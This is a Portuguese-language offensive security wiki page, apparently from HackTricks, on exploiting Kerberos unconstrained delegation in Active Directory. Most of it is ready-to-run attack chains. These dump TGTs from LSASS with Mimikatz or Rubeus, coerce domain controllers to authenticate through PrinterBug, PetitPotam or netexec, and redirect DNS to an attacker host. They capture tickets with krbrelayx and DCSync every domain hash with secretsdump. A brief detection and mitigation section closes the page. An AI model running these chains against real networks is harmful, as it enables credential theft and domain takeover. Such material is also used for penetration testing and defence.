# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained delegation

Este é um recurso que um Domain Administrator pode configurar em qualquer **Computer** dentro do domínio. Então, sempre que um **usuário fizer login** no Computer, uma **cópia do TGT** desse usuário será **enviada dentro do TGS** fornecido pelo DC **e salva na memória do LSASS**. Portanto, se você tiver privilégios de Administrator na máquina, poderá **extrair os tickets e personificar os usuários** em qualquer máquina.

Assim, se um domain admin fizer login em um Computer com o recurso "Unconstrained Delegation" ativado e você tiver privilégios de administrador local nessa máquina, poderá extrair o ticket e personificar o Domain Admin em qualquer lugar (domain privesc).

Você pode **encontrar objetos Computer com este atributo** verificando se o atributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contém [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Isso pode ser feito com um filtro LDAP ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que é o que o powerview faz:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Carregue o ticket do Administrator (ou do usuário vítima) na memória com **Mimikatz** ou **Rubeus para um** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Mais informações: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Mais informações sobre Unconstrained delegation no ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Se um atacante conseguir **comprometer um computador permitido para "Unconstrained Delegation"**, ele poderá **enganar** um **servidor de impressão** para que ele **faça login automaticamente** nesse computador, **salvando um TGT** na memória do servidor.\
Em seguida, o atacante poderá realizar um **ataque Pass the Ticket para personificar** o usuário representado pela conta de computador do servidor de impressão.

Para fazer um servidor de impressão realizar login em qualquer máquina, você pode usar [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Se o TGT vier de um controlador de domínio, você poderá realizar um [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) e obter todos os hashes do DC.\
[**Mais informações sobre este ataque em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Veja aqui outras formas de **forçar uma autenticação:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Qualquer outro mecanismo de coerção que faça a vítima se autenticar com **Kerberos** no seu host com unconstrained delegation também funciona. Em ambientes modernos, isso geralmente significa substituir o fluxo clássico do PrinterBug por **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** ou coerção baseada em **WebClient/WebDAV**, dependendo de qual superfície RPC está acessível.

### Abusando de uma conta de usuário/serviço com unconstrained delegation

Unconstrained delegation **não se limita a objetos de computador**. Uma **conta de usuário/serviço** também pode ser configurada como `TRUSTED_FOR_DELEGATION`. Nesse cenário, o requisito prático é que a conta receba service tickets Kerberos para um **SPN que ela possui**.

Isso leva a 2 caminhos ofensivos muito comuns:

1. Você compromete a senha/hash da **conta de usuário** com unconstrained delegation e, em seguida, **adiciona um SPN** à mesma conta.
2. A conta já possui um ou mais SPNs, mas um deles aponta para um **hostname obsoleto/desativado**; recriar o **registro DNS A** ausente é suficiente para sequestrar o fluxo de autenticação sem modificar o conjunto de SPNs.<sup>[[8]](#references)</sup>

Fluxo mínimo no Linux:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notas:

- Isso é especialmente útil quando o principal com **Unconstrained Delegation** é uma **service account** e você só possui as credenciais dela, sem **code execution** em um host ingressado no domínio.
- Se o usuário-alvo já tiver um **SPN obsoleto**, recriar o **registro DNS** correspondente pode gerar menos ruído do que gravar um novo SPN no AD.
- O tradecraft recente focado em Linux usa `addspn.py`, `dnstool.py`, `krbrelayx.py` e uma primitiva de coerção; não é necessário tocar em um host Windows para concluir a cadeia.

### Abusando de Unconstrained Delegation com um computador criado pelo atacante

Os domínios modernos geralmente têm `MachineAccountQuota > 0` (o padrão é 10), permitindo que qualquer principal autenticado crie até N objetos de computador. Se você também possuir o privilégio de token `SeEnableDelegationPrivilege` (ou direitos equivalentes), poderá configurar o computador recém-criado para ser confiável para **unconstrained delegation** e coletar TGTs de entrada de sistemas privilegiados.<sup>[[1]](#references)</sup>

Fluxo de alto nível:

1) Crie um computador sob seu controle
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Tornar o hostname falso resolvível dentro do domínio
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Habilitar Unconstrained Delegation no computador controlado pelo atacante
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Por que isso funciona: com unconstrained delegation, o LSA em um computador habilitado para delegation armazena em cache os TGTs recebidos. Se você induzir um DC ou servidor privilegiado a se autenticar no seu host falso, o TGT da máquina será armazenado e poderá ser exportado.

4) Inicie o krbrelayx no modo de exportação e prepare o material Kerberos
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Force a autenticação do DC/servidores para o seu host falso
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
O krbrelayx salvará arquivos ccache quando uma máquina se autenticar, por exemplo:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Use o TGT da máquina DC capturado para realizar DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0` permite a criação de computadores por usuários sem privilégios; caso contrário, são necessários direitos explícitos.
- Definir `TRUSTED_FOR_DELEGATION` em um computador exige `SeEnableDelegationPrivilege` (ou privilégios de administrador do domínio).
- Garanta a resolução de nomes para o seu host falso (registro DNS A), para que o DC possa alcançá-lo pelo FQDN.
- A coerção exige um vetor viável (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN etc.). Desative esses vetores nos DCs, se possível.
- Se a conta vítima estiver marcada como **"Account is sensitive and cannot be delegated"** ou for membro de **Protected Users**, o TGT encaminhado não será incluído no ticket de serviço; portanto, esta cadeia não produzirá um TGT reutilizável.<sup>[[9]](#references)</sup>
- Se o **Credential Guard** estiver habilitado no cliente/servidor que realiza a autenticação, o Windows bloqueará o **Kerberos unconstrained delegation**, o que pode fazer com que caminhos de coerção válidos falhem do ponto de vista do operador.

Ideias de detecção e hardening:

- Gere alertas para os Event IDs 4741 (conta de computador criada) e 4742/4738 (conta de computador/usuário alterada) quando o UAC `TRUSTED_FOR_DELEGATION` estiver definido.
- Monitore adições incomuns de registros DNS A na zona do domínio.
- Fique atento a picos nos eventos 4768/4769 provenientes de hosts inesperados e a autenticações de DCs em hosts que não são DCs.
- Restrinja `SeEnableDelegationPrivilege` a um conjunto mínimo, defina `MachineAccountQuota=0` quando viável e desative o Print Spooler nos DCs. Enforce LDAP signing e channel binding.

### Mitigação

- Limite os logins de DA/Admin a serviços específicos.
- Defina **"Account is sensitive and cannot be delegated"** para contas privilegiadas.

## Referências

- [1] [HTB: Delegate — credenciais do SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync para DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Comprometimento do domínio via unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (fork do CME)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation no Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Grupo de segurança Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Comprometimento do domínio via servidor de impressão do DC e Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
